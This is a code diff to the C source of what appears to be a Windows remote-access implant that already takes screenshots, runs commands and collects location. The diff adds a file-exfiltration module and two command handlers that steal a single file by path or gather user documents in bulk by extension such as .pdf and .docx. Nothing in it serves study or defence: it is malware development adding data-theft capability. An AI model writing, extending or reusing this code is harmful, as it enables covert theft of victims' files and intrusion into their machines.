@@ -13,6 +13,7 @@
 #include "screenshot.c"
 #include "command_executor.c"
 #include "location_collector.c"
+#include "file_exfiltrator.c"
 
 #ifdef _WIN32
 #pragma comment(lib, "wininet.lib")
@@ -43,6 +44,8 @@ typedef enum {
     CMD_INFO_COLLECT = 5,
     CMD_EXECUTE = 6,
     CMD_LOCATION = 7,
+    CMD_FILE_EXFILTRATE = 8,
+    CMD_FILE_EXFILTRATE_BATCH = 9,
     CMD_NONE = 0
 } CapabilityCommand;
 
@@ -333,6 +336,30 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
             break;
         case CMD_LOCATION:
             output = get_location_info();
+            break;
+        case CMD_FILE_EXFILTRATE:
+            // Use filepath from args
+            if (data->args && strlen(data->args) > 0) {
+                output = exfiltrate_file(data->args);
+                if (!output) {
+                    output = strdup("failed to exfiltrate file");
+                }
+            } else {
+                const char *error = "{\"error\":\"No filepath provided\"}";
+                output = base64_encode((unsigned char*)error, strlen(error));
+            }
+            break;
+        case CMD_FILE_EXFILTRATE_BATCH:
+            // Use extensions from args (format: ".pdf,.docx" or "C:\\path|.pdf,.docx")
+            if (data->args && strlen(data->args) > 0) {
+                output = exfiltrate_user_files_by_extension(data->args);
+                if (!output) {
+                    output = strdup("failed to exfiltrate files");
+                }
+            } else {
+                const char *error = "{\"error\":\"No extension filter provided\"}";
+                output = base64_encode((unsigned char*)error, strlen(error));
+            }
             break;
         default:
             break;
